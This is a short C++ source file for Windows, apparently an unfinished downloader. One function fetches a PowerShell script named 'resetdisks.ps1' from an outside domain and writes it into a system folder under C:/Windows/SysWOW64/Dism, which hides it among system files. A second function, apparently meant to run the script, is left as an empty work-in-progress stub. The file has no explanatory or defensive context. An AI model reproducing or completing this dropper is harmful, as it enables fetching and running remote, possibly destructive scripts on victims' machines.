#pragma comment(lib, "urlmon.lib")

#include<iostream>
#include <io.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string>
#include <urlmon.h>
#include <tchar.h>
using namespace std;

void downldresetdisks()
{
    HRESULT result = URLDownloadToFile(NULL, _T("http://pogware.club/resetdisks.ps1"), _T("c:/Windows/SysWOW64/Dism/resetdisks.ps1"), 0, NULL); // download ps from url
}

void callresetdisks()
{
    // WIP
}
